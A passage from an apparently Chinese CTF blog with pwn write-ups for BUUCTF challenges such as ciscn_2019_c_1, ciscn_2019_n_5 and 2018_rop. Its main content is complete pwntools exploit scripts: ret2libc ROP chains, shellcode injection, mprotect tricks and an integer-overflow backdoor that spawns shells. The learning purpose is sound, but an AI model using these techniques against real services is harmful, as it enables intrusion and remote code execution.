class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">sh=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29738</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">puts_plt=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=e.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">rdi_addr=<span class="number">0x0000000000400c83</span></span><br><span class="line">ret=<span class="number">0x00000000004006b9</span></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(b<span class="number">&#x27;1&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">padding=b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>+b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">0x57</span></span><br><span class="line">sh.sendline(padding+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr))</span><br><span class="line">sh.recvuntil(b<span class="number">&#x27;</span>Ciphertext\n\n<span class="number">&#x27;</span>)   </span><br><span class="line">puts_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">libc_base=puts_addr<span class="number">-0x0809c0</span></span><br><span class="line">system=libc_base+<span class="number">0x04f440</span></span><br><span class="line">binsh=libc_base+<span class="number">0x1b3e9a</span></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(b<span class="number">&#x27;1&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(padding+p64(rdi_addr)+p64(binsh)+p64(ret)+p64(system))</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX unknown - GNU_STACK missing</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br><span class="line">Stack:    Executable</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> text[<span class="number">30</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tell me your name&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">0x64</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wow~ nice name!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to say to me?&quot;</span>);</span><br><span class="line">  gets(text);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>text在栈上，栈溢出</p><p>但是呢第一想法是构造ROP链，但是在ROPgadget的时候发现几乎没有适合的rop，所以只能换个想法了</p><p>发现name可写，又有rwx，因此就直接写shellcode，之后ret就行了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">binary=<span class="string">&#x27;./ciscn_2019_n_5&#x27;</span></span><br><span class="line"><span class="meta">#sh=process(binary)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29953</span>)</span><br><span class="line">elf=ELF(binary)</span><br><span class="line"></span><br><span class="line">ret=<span class="number">0x0000601080</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)  </span><br><span class="line">shellcode=<span class="keyword">asm</span>(shellcraft.sh()) </span><br><span class="line"></span><br><span class="line">sh.recvuntil(b<span class="number">&#x27;</span>tell me your name\n<span class="number">&#x27;</span>)</span><br><span class="line">sh.send(shellcode)</span><br><span class="line">sh.recvuntil(b<span class="number">&#x27;</span>What <span class="keyword">do</span> you want to say to me?<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">pal=0x28*b&#x27;</span>a<span class="number">&#x27;</span>+p64(ret)</span><br><span class="line">sh.send(pal)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>这道题学到了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>) </span><br><span class="line">shellcode=<span class="keyword">asm</span>(shellcraft.sh()) </span><br></pre></td></tr></table></figure><p>首先导入pwntool模块，之后便可以有自助shellcode，虽然我之前都是手写的但是容易挂</p><h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br></pre></td></tr></table></figure><p>同<code>ciscn_2019_c_1</code></p><h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/shared/ctf-learn/3dsctf_2016&#x27;</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bamboo@bamboo-virtual-machine:/mnt/hgfs/shared/ctf-learn$ ROPgadget --binary <span class="number">3</span>dsctf_2016 --only <span class="string">&#x27;int&#x27;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line"><span class="number">0x0806d8a5</span> : <span class="type">int</span> <span class="number">0x80</span></span><br><span class="line"></span><br><span class="line">Unique gadgets found: <span class="number">1</span></span><br></pre></td></tr></table></figure><p>发现ROPgadget有些东西找不出来这时候就要使用ropper函数</p><h3 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h3><p>Roopper 的语法基本上由命令和选项组成。下面是一些常用的 Roopper 命令和选项的示例：</p><ol><li><p>分析二进制文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper -f &lt;binary_file&gt;</span><br></pre></td></tr></table></figure></li><li><p>搜索特定指令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper -f &lt;binary_file&gt; --search &lt;instruction&gt;</span><br></pre></td></tr></table></figure></li><li><p>根据模式匹配搜索：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper -f &lt;binary_file&gt; --search &lt;pattern&gt; --pattern</span><br></pre></td></tr></table></figure></li><li><p>过滤和排序指令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper -f &lt;binary_file&gt; --opcode &lt;opcode&gt; --type &lt;type&gt; --sort &lt;sort_type&gt;</span><br></pre></td></tr></table></figure></li><li><p>生成 ROP 链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper -f &lt;binary_file&gt; --chain <span class="string">&quot;&lt;gadget1&gt;;&lt;gadget2&gt;;...&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>显示帮助信息：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper --help</span><br></pre></td></tr></table></figure></li></ol><p>上述命令中的 <code>&lt;binary_file&gt;</code> 是要分析的二进制文件的路径。</p><p>其中，该程序是 32 位，所以我们需要使得</p><ul><li>系统调用号，即 eax 应该为 0xb      <strong>说明即使是32位的在执行syscall时的参数仍然在寄存器中</strong></li><li>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0</li><li>第三个参数，即 edx 应该为 0</li></ul><p>但是呢没有&#x2F;bin&#x2F;sh所以在栈上构造</p><p>所以泄露栈？</p><p>但是我们发现好像没法玩，因为什么都没有</p><p>这时候是在搞不了发现原来有后门函数，真的绷不住了</p><p>首先shift+F12找到有个flag.txt字符串，然后ctrl+x找到调用的函数</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211042.png" alt="image-20240306192130678" style="zoom:50%;" /><p>然后发现只有fget，实在是不会了，该flag位置在0x80ECA2D然后ctrl+s有rw权限因此读flag</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211043.png" alt="image-20240306193620444"></p><p>但是有个问题，我发现<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211044.png" alt="image-20240306195251819"></p><p>他根本没有push ebp，靠！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line"><span class="title function_">context</span><span class="params">(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26826</span>)</span><br><span class="line"></span><br><span class="line">flag_addr=<span class="number">0x80ECA2D</span></span><br><span class="line">backdoor=<span class="number">0x80489A0</span></span><br><span class="line"><span class="built_in">printf</span>=<span class="number">0x0804f0a0</span></span><br><span class="line"><span class="built_in">exit</span>=<span class="number">0x0804e660</span></span><br><span class="line">pal=<span class="number">0x2d</span>*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>+p32(backdoor)+p32(<span class="built_in">printf</span>)+p32(<span class="built_in">exit</span>)+p32(flag_addr)</span><br><span class="line">sh.sendline(pal)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="二解"><a href="#二解" class="headerlink" title="二解"></a>二解</h3><p>我一开始的思路是利用main函数里的gets造成溢出，覆盖返回地址去读出flag，然后利用get_secret函数的输入点造成溢出然后覆盖返回地址到write函数的地址，打印出unk_80CF91B里的flag的内容，但是后来在百度fgets的用法的时候，发现它能够避免造成溢出，而且fl4g在bss段，没有ret指令可以继续控制程序。</p><p>后来我在程序了发现了mprotect函数，可以用它来修改我们内存栈的权限，让它可读可写可执行，接着让写入shellcode，然后执行获取shell，这题的做法跟get_started_3dsctf_2016这题类似</p><p>由于需要利用ret指令控制程序，所以这里需要借助用来设置三个参数的三个寄存器命令，p3_ret&#x3D;0x806fcc8</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary not_the_same_3dsctf_2016 --only <span class="string">&quot;pop|ret&quot;</span>|grep pop</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211045.png" alt="在这里插入图片描述"></p><p>ctrl+s调出程序的段表，将.got.plt段改为可读可写可执行,addr&#x3D;0x80eb000</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload  =<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(mprotect)+p32(p3_ret)</span><br><span class="line">payload +=p32(addr)+p32(<span class="number">0x100</span>)+p32(<span class="number">0x7</span>)</span><br></pre></td></tr></table></figure><p>将返回地址填写成read函数，设置read函数的参数，之后将返回地址改为我们修改为可读可写可执行的地址，最好读入shellcode</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload +=p32(read_addr)+p32(p3_ret)</span><br><span class="line"></span><br><span class="line">payload +=p32(<span class="number">0</span>)+p32(addr)+p32(len(shellcode))+p32(addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(shellcode)</span><br></pre></td></tr></table></figure><p>完整EXP</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29651</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line">read_addr=elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">mprotect=<span class="number">0x806ED40</span></span><br><span class="line">addr=<span class="number">0x80eb000</span></span><br><span class="line">p3_ret=<span class="number">0x806fcc8</span></span><br><span class="line"></span><br><span class="line">shellcode=<span class="keyword">asm</span>(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload  =<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(mprotect)+p32(p3_ret)</span><br><span class="line">payload +=p32(addr)+p32(<span class="number">0x100</span>)+p32(<span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line">payload +=p32(read_addr)+p32(p3_ret)</span><br><span class="line"></span><br><span class="line">payload +=p32(<span class="number">0</span>)+p32(addr)+p32(len(shellcode))+p32(addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>exp看的不是很懂，但是大概理解意思</p><h2 id="iscn-2019-ne-5"><a href="#iscn-2019-ne-5" class="headerlink" title="iscn_2019_ne_5"></a>iscn_2019_ne_5</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure><p>在做这道题的时候，发现自己32位传参还是有一定的不理解</p><p>32位传参：</p><p>一般是依靠类似于</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">垃圾数据+ret_addr+某返回地址(bbbb)+arg1+arg2+.....</span><br></pre></td></tr></table></figure><p>这样子的，因为ret_addr的后面要紧跟某一个要返回的地址，这个东西编译器会处理好的，但是如果想要一次调用两个以上的函数，应该要先弹栈</p><p>例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system_addr+pop|ret+/bin/sh_addr+下一个函数</span><br></pre></td></tr></table></figure><p>如此如此</p><p>还有一个问题便是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)src = <span class="number">48</span>;</span><br></pre></td></tr></table></figure><p>ida里的一个语句，我点进去src的时候发现src在栈上，但是src是一个地址，所以我很好奇src到底是在栈上还是在栈上的一个地址，其实src就是在栈上，但是其指向的不一定在栈上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">GetFlag</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">60</span>]; <span class="comment">// [esp+4h] [ebp-44h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_DWORD *)dest = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;The flag is your log:%s\n&quot;</span>, dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>src可控显然栈溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bamboo@bamboo-virtual-machine:/mnt/hgfs/shared/ctf-learn$ ROPgadget --binary ciscn_2019_ne_5 --<span class="built_in">string</span> <span class="string">&#x27;sh&#x27;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line"><span class="number">0x080482ea</span> : sh</span><br></pre></td></tr></table></figure><p>找到sh，幸运的是sh是flussh的sh其后面\x00截断，不然打不了</p><h2 id="2018-rop"><a href="#2018-rop" class="headerlink" title="2018_rop"></a>2018_rop</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+10h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>溢出6个地址的长度，1个ebp所以只有一次只有5个，返回地址改main，4个地址长度</p><p>那么这里啥都没有，所以先泄露libc版本，然后system(‘’&#x2F;bin&#x2F;sh’)即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">sh=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28188</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pal=(<span class="number">0x88</span>+<span class="number">4</span>)*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>+p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])+p32(elf.sym[<span class="string">&#x27;main&#x27;</span>])+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">&#x27;write&#x27;</span>])+p32(<span class="number">4</span>)</span><br><span class="line">sh.send(pal)</span><br><span class="line">write_addr=u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">print(<span class="string">&quot;write_addr===&gt;&quot;</span>,hex(write_addr))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line"></span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">pal=(<span class="number">0x88</span>+<span class="number">4</span>)*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>+p32(system_addr)+p32(elf.sym[<span class="string">&#x27;main&#x27;</span>])+p32(binsh_addr)</span><br><span class="line">sh.sendline(pal)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br></pre></td></tr></table></figure><p>与上题一样</p><h2 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/shared/ctf-learn/2020_babystack2&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">12</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  LODWORD(nbytes) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;**********************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*     Welcome to the BJDCTF!     *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* And Welcome to the bin world!  *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*  Let&#x27;s try to pwn the world!   *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* Please told me u answer loudly!*&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Are u ready?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Please input the length of your name:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)nbytes &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Oops,u name is too long!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]What&#x27;s u name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, (<span class="type">unsigned</span> <span class="type">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显的整数溢出，一个输入0可以几乎无限溢出</p><p>然后一个backdoor</p><p>就搞定了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28161</span>)</span><br><span class="line"><span class="meta">#r=process(<span class="string">&#x27;./bjdctf_2020_babystack2&#x27;</span>)</span></span><br><span class="line">backdoor_addr=<span class="number">0x400726</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;[+]Please input the length of your name:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=b<span 